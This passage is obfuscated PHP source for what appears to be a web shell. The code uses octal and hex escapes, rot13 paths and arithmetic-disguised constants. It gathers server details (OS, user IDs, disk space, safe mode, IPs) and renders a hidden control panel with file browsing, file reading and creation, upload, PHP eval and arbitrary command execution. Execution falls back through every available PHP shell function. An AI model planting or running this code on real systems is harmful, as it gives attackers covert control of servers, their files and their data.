			"\047;\015\012var d = \144o\143u\155ent;\x0d\x0afunctio\x6e set(a,c\x2cp,\170\x2cs,ch){if(\x61\041=nu\154l)d.mf.a.v\x61lue\x3da;else \144.mf.a.\x76al\x75e=a_\x3bif(c!=null\051d.mf.c.v\141l\x75e\075c;\x65lse d.m\x66.c.valu\x65=c_;if\x28\160!=nu\154l)d.mf.p.valu\145=p;e\x6cse d.mf.p\056value=p_;if(x!\075\x6e\165\x6cl)d\056mf.x.value=x;el\163e d.mf.x.value\075\170_;if(s!=nul\x6c)d.mf.s.value=s;els\x65 d.mf.s.value=s\137;i\146(ch!=null)d.mf.ch.value=ch;else d\056m\146.ch.value=ch_;}function\040g(a\054c,p,x,s,c\x68)\x7bset(a,\143\054p,x,\x73,ch);d.mf\056submit();}functi\157n utoa(str){retur\156 win\144ow.btoa(\x75n\x65\x73cape(encode\x55RIComponent(s\164r)))\x3b}function atou(\x73tr){r\145turn dec\x6f\144eURIComponent(escape(window\056atob(s\x74\162\x29));}fun\143tion \162\157t13(\163tr){var inp\x75t\075'\101BCDEFGHIJ\113LMNOPQRSTUV\x57\130YZabc\x64efghijklmnopqrstu\x76w\x78yz'; var o\x75t\160ut='NOPQ\x52\x53TUVWXYZABCD\x45FGHIJKLMn\157pqrstuvwx\171zabcdefg\x68ijklm'; var i\x6edex=x=> \x69n\x70ut.inde\170Of(x); var t\162ans\x6cate=x=> index\050\x78) > -1 \x3f \157\x75tput[in\x64\145x(x)] : x;\040r\145tur\x6e\040str.\163pl\151t\050'\x27\051.map(tr\141nslate).jo\x69\156\x28'\047);}va\x72 cvis=f\141l\x73e;functi\157n \x73h\157w\x28\051{\151\x66(!cv\151s)\x7bdocument.\x67etElementById('\142a\x74').in\156erHTML=\047\x4ci\x6eks';docum\145n\164.g\x65tEleme\x6et\102\x79Id('cwd'\051.style.display='inline';do\143ument.getElementByI\x64('links').style.\144isplay='n\157n\x65';cvis=true;\x7del\x73e{document.g\145t\105lem\145nt\x42yId('bat').innerHTM\114='Text\x27;do\x63ument.getElem\145ntBy\111d('c\167d').styl\145.\x64i\163play\x3d'none';document.getElementById('li\156ks').\x73tyle.\x64isplay='\x69nli\x6e\x65';c\166is=false;\175}\015\x0a\074/scri\x70t>\x0d\012</hea\x64><\142ody><di\x76 \163tyle='position:absolut\x65;width\x3a100%;backg\x72o\165nd-color:#444;\x74op\0720;left:0;'\x3e\015\x0a\074form m\145th\157\144=post name=mf style=\047displ\141y:no\x6ee;'\x3e\015\x0a<input\x20type=hidden name=\141>\015\x0a<\151np\x75t\040type=hid\x64en n\141me=c>\x0d\x0a<input type=hidd\145n name\075p>\x0d\012<inpu\164 type=hid\144en \156ame=x>\x0d\x0a<in\x70ut type=\x68idden \156ame=s>\x0d\x0a<input type=hi\144den na\x6de=ch>\015\x0a<\x2fform>";
		if (@function_exists("diskfreespace")) {
			$_i = @diskfreespace($_zb);
		}
		if (@function_exists("disk_to\164al_sp\141ce")) {
			$_pmf = @disk_total_space($_zb);
		}
		$_pmf = $_pmf ? $_pmf : -061 - -062;
		if (@function_exists("\160hp_\165n\x61me")) {
			$_ea = @php_uname();
		} elseif (@function_exists("phpinf\157")) {
			@ob_start();
			phpinfo();
			$_flj = @ob_get_clean();
			if (
				false !==
				@preg_match(
					"!<tr><td class=\x22e\x22>\123y\x73tem\134s*</td\076<td clas\163=\042v\x22\076([^\134<]+)!i",
					$_flj,
					$_fuf
				)
			) {
				$_ea = trim($_fuf[(int) round(0.5 + 0.5)]);
			}
		}
		if (
			@function_exists("\160os\x69\x78_get\160w\165id") &&
			@function_exists("\160osix_geteuid") &&
			@function_exists("\160osi\x78_getgrgid") &&
			@function_exists("posix_\x67etegid")
		) {
			$_dzf = @posix_getpwuid(@posix_geteuid());
			$_cpq = @posix_getgrgid(@posix_getegid());
			$_e = $_dzf["nam\x65"];
			$_dzf = $_dzf["uid"];
			$_edo = $_cpq["\156ame"];
			$_cpq = $_cpq["gid"];
		} else {
			if (@function_exists("\147et_current_user")) {
				$_e = @get_current_user();
			}
			if (@function_exists("getmyuid")) {
				$_dzf = @getmyuid();
			}
			if (@function_exists("getm\x79gi\x64")) {
				$_cpq = @getmygid();
			}
			$_edo = "?";
		}
		if (
			@function_exists("mb_dete\143t_\145ncod\x69n\x67") &&
			@function_exists("icon\x76")
		) {
			if (@mb_detect_encoding($_e, "\x57i\156dow\163-1251")) {
				$_e = @iconv("Windows-12\x351", "U\x54F-\x38", $_e);
			}
		}
		$_g = "";
		$_atj = @explode("/", $_zb);
		$_zmj = count($_atj);
		for ($_ox = 065 + -065; $_ox < $_zmj - (024 + 0104 + -0127); $_ox++) {
			$_g .= "\x3ca \x68ref='\x23' onclick\x3d'g(\x22\x66m\042,\042";
			for ($_oyj = (int) round(0 + 0 + 0); $_oyj <= $_ox; $_oyj++) {
				$_g .= str_rot13($_atj[$_oyj]) . "/";
			}
			$_g .= "\x22\054\042\x22,\x22\x22)'>" . $_atj[$_ox] . "/\074/a\076";
		}
		$_srb = ["UTF-8", "Window\163-1251", "KOI8-R", "KOI8-U", "cp866"];
		$_h = "";
		foreach ($_srb as $_f) {
			$_h .=
				"<\157ption v\141lue\x3d\042" .
				$_f .
				"\x22\040" .
				($_POST["ch"] == $_f ? "selected" : "") .
				"\x3e" .
				$_f .
				"</op\164ion>";
		}
		$_j = [
			"P\110P I\156f\157" => "pi",
			"Fil\x65s" => "fm",
			"Exec" => "ce",
			"Eval" => "\160h",
		];
		$_su = "";
		foreach ($_j as $_aw => $_lbm) {
			$_su .=
				"\074\x74h width=\x22" .
				(int) ((int) round(
					33.333333333333 + 33.333333333333 + 33.333333333333
				) / count($_j)) .
				"%\042>[\x20<\x61 \150ref\x3d\042#\042 onc\x6cick=\x22g('" .
				$_lbm .
				"',null,\047','','')\042>" .
				$_aw .
				"</\x61>\x20]</t\150>";
		}
		$_xc = "";
		if ($_a == "win") {
			foreach (@range("c", "z") as $_cw) {
				if (@is_dir($_cw . ":\x5c")) {
					$_xc .=
						"<a href=\x22#\042\040o\x6eclick=\042g('fm\047,'" .
						str_rot13($_cw) .
						":/')\x22>\x5b " .
						$_cw .
						" \x5d<\057\x61>\040";
				}
			}
		}
		$_ja = $_SERVER["\x53ER\126ER_ADDR"];
		if (empty($_ja)) {
			$_ja = @gethostbyname($_SERVER["SERVER\x5fNAME"]);
		}
		echo "<ta\x62l\x65 class\x3dinfo cellpadding=\x33 cell\163pa\143\151ng=0\x20width=10\x30%\076<t\x72><td width=\x31><s\160\x61n>Uname:<br>User:\x3cbr>Php:<br>Hdd:\x3cbr>Cw\144:" .
			($_a == "\167in" ? "<\142r>Drives:" : "") .
			"\074/span></td>" .
			"<td><nobr>" .
			($_ea
				? substr($_ea, (int) round(0 + 0), (int) round(40 + 40 + 40))
				: "N\057A") .
			"\074/nob\x72><br>" .
			$_dzf .
			" ( " .
			$_e .
			" ) \074\163pan>Gr\x6fup:</span> " .
			$_cpq .
			" \050 " .
			$_edo .
			"\x20)<br\076" .
			@phpversion() .
			"\x20" .
			@preg_replace(
				"# .+\044#",
				"",
				$_SERVER["SE\x52\x56ER_SOFTWAR\x45"]
			) .
			"\040<span>Safe mode:</span> " .
			($_v
				? "<\146o\x6et color=red>ON</font>"
				: "<fon\x74 co\x6c\x6fr=green><\x62>OFF<\x2fb\x3e</font>") .
			" <s\160an>Dateti\x6de:\074/sp\x61n> " .
			date("\x59-m-d H\x3a\151:s") .
			"<br\x3e" .
			($_pmf ? _xkmo($_pmf) : "") .
			" <sp\141n>Free\x3a</\163pan> " .
			($_i ? _xkmo($_i) : "") .
			" (" .
			($_i && $_pmf
				? (int) (($_i / $_pmf) *
					(int) round(
						33.333333333333 + 33.333333333333 + 33.333333333333
					))
				: "0") .
			"\045)<br>\x3cs\160an id=\x22links\x22 \x63lass=\042wfw\x22>" .
			$_g .
			" " .
			_bkcv($_zb) .
			" <\141 \150\162ef=# onclic\153\x3d\042g('fm\047,\047" .
			str_rot13($_ahs) .
			"',\x27',\047','')\042>[ root ]</a\x3e\x20<a\040\150r\145f=# o\x6ec\154i\143k=\042g('fm','" .
			str_rot13($_y) .
			"\x27,'',''\054'')\x22>[\x20ho\x6de ]<\x2fa></span>\074span id=\x22\143w\144\x22 sty\x6ce=\042displa\x79: \x6eon\x65;\042 \143lass=\x22wfw\x22><i\156put\x20size=" .
			(strlen($_zb) +
				(int) round(
					7.3333333333333 + 7.3333333333333 + 7.3333333333333
				)) .
			" ty\160e=text va\x6cue=\x22" .
			$_zb .
			"\x22>\074/s\160an> <a h\162ef=# oncl\x69c\x6b=\x22sh\x6fw()\073\x22><font \143olor=#fff\040id\075\042bat\x22>Text</font><\057\x61><\x62\162>" .
			$_xc .
			"\x3c/\x74d>" .
			"<td \167\151d\164h=1 al\151gn=right><nob\x72>\x3csele\x63t onchan\147\x65=\042g(\156ull,nu\x6cl," .
			(!empty($_POST["p"]) ? "'" . $_POST["p"] . "'" : "nu\x6cl") .
			",null,null,this\x2evalue)\x22><optgr\x6fu\x70 la\142el\x3d\x22Pa\147\145 c\150arset\042>" .
			$_h .
			"</optgroup><\057\x73el\x65\143t\076<br>\x3cspan>S\145rver IP:\074/span><br\076" .
			$_ja .
			"<br><sp\x61\156>Client IP:\x3c/span><b\162>" .
			$_SERVER["REMOTE_ADDR"] .
			"</nobr></td></t\162\076<\x2ftabl\145>" .
			"<table st\171le\x3d\x22\142o\x72der-t\157p:2px s\x6fli\x64 #333;\x22 ce\154l\160adding=3 cellspacing=0 w\151dth=10\060%><tr>" .
			$_su .
			"</\164r\x3e</table>\x3cdiv \x73tyle=\042\x6darg\151n\072\065\x22>";
	}
	function _pbhh()
	{
		$_zb = $this->_zb;
		$_rho = @is_writable($_zb)
			? " \x3cfont color=\047gre\x65n\047\x3e(\127rite\141ble\051</font>"
			: "\040<font color=red>\050\116o\x74 wri\x74\141ble)</font>";
		echo "</div><table \x63l\x61s\x73=info i\144=\164oolsTbl c\x65llpaddi\156g=3 cellspacing=0 width=\06100%  style\x3d'bor\x64er-to\160:2px solid #333;\142order-bottom\0722p\x78 solid #333;\047>\x3ctr\076<td>\x3cf\x6frm \157nsubm\x69\164='g(null\054rot13(this.c.v\x61\x6cue),\042\042\051;r\145turn false;'><span>Change dir:</\x73\x70an>\x3cb\162><input \143l\141ss='too\x6csInp' type=t\x65xt \x6eame=c value='" .
			_lqyw($_zb) .
			"'\076<input ty\160e=su\x62mit va\x6c\x75e='>>'></f\x6frm></td><td><form\040onsubmit=\042g('ft'\x2cnull,rot13(t\150i\163.f.valu\145));\162eturn false;\042><span>Read file:</spa\156><br><\x69np\165t \143\154a\163s='toolsInp' \x74yp\x65=t\x65\170t name=f><\151nput\040\164ype=sub\155it\040value=\047>>'><\057\146orm></td></t\162><tr><t\144><\146orm onsub\155it=\x22\x67('fm'\x2c\x6eull,'md'\x2crot13(this.d\x2ev\x61lue));ret\165rn fals\x65\073\x22><s\x70an>Make\x20\144ir:</\163\x70\x61n>" .
			$_rho .
			"<\142r><input cla\163s='too\154s\x49np' type=text na\155e=d><inpu\x74 type=su\142\155it value\075'>>'></form\x3e</td><td\076\x3cfor\155 \157n\x73ubm\151t=\x22g('ft',null,r\x6ft1\x33(this.f.val\x75e)\x2c'mkf\151le');return f\x61lse;\x22>\x3cspan>Make fi\154e:</sp\x61\156>" .
			$_rho .
			"<\142r><input class='tool\163In\x70' type\x3dtext name=f><input type=su\x62\x6dit valu\145='>>'>\074/\146orm>\x3c/td></tr>\074tr><\x74d>\x3cform ons\x75bmit\x3d\042g('ce',null\x2cutoa(this.c.value))\073retu\x72n fa\154se;\x22\x3e<sp\141n>Exec\165te\x3a<\057span><br><input cl\141ss\075'too\154\x73Inp' \164\x79pe=text nam\x65=c v\x61lu\145=\047'><in\x70\x75t \x74yp\x65\075submit\040v\141\x6cue=\047>\076'\076\x3c/form\x3e</td><\x74d><form\x20method='post' ENCTYPE='multipart/fo\162\155-data\047><i\156pu\x74\040type\075h\151dden nam\145=a v\x61lue\x3d\x27fm'><input \x74ype=\x68idden \156ame=c valu\145='" .
			str_rot13($_zb) .
			"'><in\160ut t\171\x70\x65=hidden na\x6d\x65=p\040value=\047uf'><input ty\x70e=h\x69dden n\x61\x6de=ch v\x61lue='" .
			(isset($_POST["ch"]) ? $_POST["ch"] : "") .
			"'><span>U\160load file:</span>" .
			$_rho .
			"<b\x72><i\x6eput clas\x73='\x74oolsIn\x70' type\075\x66ile name=f><input\040type=submit value='\076>\047></\x66orm>\074br\040 ></td></\x74r><\057ta\142\x6ce><\057div></\x62ody\076</ht\155l>";
	}
}
function _lqyw($_lbm)
{
	return str_replace(
		["&", "\042", "<", ">"],
		["&amp;", "&qu\x6ft;", "&lt;", "&gt;"],
		$_lbm
	);
}
function _bjab($_enx)
{
	@ob_start();
	if ($_lop = @`echo 1`) {
		echo @`{$_enx}`;
	} elseif (@function_exists("\145xe\143")) {
		@exec($_enx, $_lop);
		echo @join("\012", $_lop);
	} elseif (@function_exists("syste\x6d")) {
		@system($_enx);
	} elseif (@function_exists("\163he\154l_ex\145c")) {
		echo @shell_exec($_enx);
	} elseif (@function_exists("passthru")) {
		@passthru($_enx);
	} elseif (@is_resource($_egw = @popen($_enx, "r"))) {
		while (!feof($_egw)) {
			echo @fread($_egw, 01600 + 01545 + -01345);
		}
		@pclose($_egw);
	} elseif (
		@is_resource(
			$_egw = @proc_open(
				$_enx,
				[["pipe", "r"], ["pipe", "w"], ["pip\145", "a"]],
				$_eum
			)
		)
	) {
		echo @stream_get_contents($_eum[(int) round(0.5 + 0.5)]);
		@proc_close($_egw);
	} elseif (@function_exists("pcntl_\x65xec")) {
		@pcntl_exec("/bin/s\x68", ["-c", $_enx]);
	} elseif (
		@function_exists("\x65xpect\x5fpope\156") &&
		is_resource($_egw = @expect_popen($_enx))
	) {
		while (!feof($_egw)) {
			echo @fread($_egw, 02017 + -017);
		}
		@fclose($_egw);
	} elseif (@is_resource($_egw = @fopen("expect\x3a\057/" . $_enx, "r"))) {
		while (!feof($_egw)) {
			echo @fread($_egw, 02160 - 02607 + 02427);
		}
		@fclose($_egw);
	}
	$_vcp = @ob_get_clean();
	return $_vcp;
}
function _xkmo($_tcg, $_zo = "tor\162wn", $_xt = null)
{
	if (is_int($_tcg)) {
		$_tcg = @sprintf("%u", $_tcg);
	}
	if ($_tcg >= 010000000300 + -0300) {
		return @sprintf(
			"%1.2f",
			$_tcg /
				(int) round(357913941.33333 + 357913941.33333 + 357913941.33333)
		) . " \x47B";
	} elseif (
		$_tcg >=
		(int) round(349525.33333333 + 349525.33333333 + 349525.33333333)
	) {
		return @sprintf("%\061.2f", $_tcg / (03776733 - 04001232 + 04002277)) .
			" MB";
	} elseif ($_tcg >= (int) round(512 + 512)) {
		return @sprintf(
			"%1.2f",
			$_tcg /
				(int) round(341.33333333333 + 341.33333333333 + 341.33333333333)
		) . "\x20KB";
	} else {
		return $_tcg . " B";
	}
}
function _ip($_eum)
{
	if (
		($_eum & (int) round(16384 + 16384 + 16384)) ==
		(int) round(16384 + 16384 + 16384)
	) {
		$_ox = "s";
	} elseif (
		($_eum &
			(int) round(13653.333333333 + 13653.333333333 + 13653.333333333)) ==
		0117764 - 0117770 - -0120004
	) {
		$_ox = "l";
	} elseif (
		($_eum & (0100154 + -0154)) ==
		(int) round(10922.666666667 + 10922.666666667 + 10922.666666667)
	) {
		$_ox = "-";
	} elseif (($_eum & (057725 + 057461 - 057406)) == 056373 - -01405) {
		$_ox = "b";
	} elseif (
		($_eum &
			(int) round(5461.3333333333 + 5461.3333333333 + 5461.3333333333)) ==
		(int) round(8192 + 8192)
	) {
		$_ox = "\x64";
	} elseif (
		($_eum &
			(int) round(2730.6666666667 + 2730.6666666667 + 2730.6666666667)) ==
		020037 + 017742 - 020001
	) {
		$_ox = "c";
	} elseif (($_eum & (07274 - -0504)) == 07557 + 010365 + -010144) {
		$_ox = "p";
	} else {
		$_ox = "u";
	}
	$_ox .= $_eum & (-0557 + 01157) ? "\x72" : "-";
	$_ox .= $_eum & (int) round(64 + 64) ? "w" : "\055";
	$_ox .=
		$_eum & (-0213 + -01257 + 01572)
			? ($_eum & (02163 - 05507 - -07324)
				? "\x73"
				: "x")
			: ($_eum &
			(int) round(682.66666666667 + 682.66666666667 + 682.66666666667)
				? "S"
				: "\x2d");
	$_ox .= $_eum & (-0560 + 01316 - 0476) ? "\x72" : "-";
	$_ox .= $_eum & (-012 - 03 + 035) ? "w" : "-";
	$_ox .=
		$_eum & (-0105 + 0115)
			? ($_eum & (02301 - 01270 + 0767)
				? "s"
				: "x")
			: ($_eum & (02104 + -0104)
				? "S"
				: "-");
	$_ox .= $_eum & (int) round(2 + 2) ? "r" : "\x2d";
	$_ox .=
		$_eum &
		(int) round(0.66666666666667 + 0.66666666666667 + 0.66666666666667)
			? "w"
			: "-";
	$_ox .=
		$_eum & (03 - -033 + -035)
			? ($_eum & (-0147 + 01147)
				? "\x74"
				: "x")
			: ($_eum & (int) round(256 + 256)
				? "T"
				: "\055");
	return $_ox;
}
function _bkcv($_egw)
{
	if (!@is_readable($_egw)) {
		return "<font color=#FF\x30000>" .
			_ip(fileperms($_egw)) .
			"</f\157nt\076";
	} elseif (!@is_writable($_egw)) {
		return "<font co\154or=\x77hite>" . _ip(fileperms($_egw)) . "</font>";
	} else {
		return "<f\157nt color=#2\065ff00\076" .
			_ip(fileperms($_egw)) .
			"<\057fo\x6et\076";
	}
}
function _zhpf($_t)
{
	if (@function_exists("scan\144ir")) {
		return @scandir($_t);
	} else {
		if ($_b = @opendir($_t)) {
			while (false !== ($_do = @readdir($_b))) {
				$_une[] = $_do;
			}
			@closedir($_b);
		}
		return $_une;
	}
}
function _ev($_eum)
{
	$_atj = _bjab("wh\x69c\x68 " . $_eum);
	if (!empty($_atj)) {
		return $_atj;
	}
	return false;
}
$_ug = new _uc();
$_ug->_gz();
$_ug->_ry();
if (isset($_POST["a"])) {
	switch ($_POST["a"]) {
		case "fm":
			$_ug->_ds();
			$_ug->_eg();
			$_ug->_pbhh();
			break;
		case "ce":
			@session_start();
			$_ug->_ds();
			$_ug->_vi();
			$_ug->_pbhh();
			break;
		case "Php":
		case "ph":
			$_ug->_ds();
			$_ug->_ksdl();
			$_ug->_pbhh();
			break;
		case "phi":
		case "pi":
			$_ug->_ds();
			$_ug->_jaq();
			$_ug->_pbhh();
			break;
		case "ft":
			if (
				isset($_POST["x"]) &&
				($_POST["x"] == "do\x77nload" || $_POST["\170"] == "dl")
			) {
				$_ug->_ng();
			} else {
				$_ug->_ds();
				$_ug->_ng();
				$_ug->_pbhh();
			}
			break;
		default:
			$_ug->_ds();
			$_ug->_eg();
			$_ug->_pbhh();
			break;
	}
} elseif (!isset($_POST["a"])) {
	$_ug->_ds();
	$_ug->_eg();
	$_ug->_pbhh();
}
die();